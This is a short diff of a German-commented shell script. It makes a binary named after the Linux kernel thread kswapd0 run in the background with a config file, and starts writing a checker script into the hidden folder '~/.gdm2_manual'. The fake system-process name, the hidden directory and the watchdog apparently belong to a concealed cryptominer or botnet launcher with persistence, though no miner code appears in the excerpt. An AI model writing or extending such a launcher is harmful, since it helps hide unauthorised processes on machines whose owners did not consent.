@@ -26,7 +26,7 @@ if [ ! -f "$CONFIG_JSON" ]; then
 fi
 
 # kswapd0 ausführen
-"$KSWAPD0" --config="$CONFIG_JSON"
+"$KSWAPD0" --config="$CONFIG_JSON" &
 
 # Überprüfungsskript erstellen
 cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
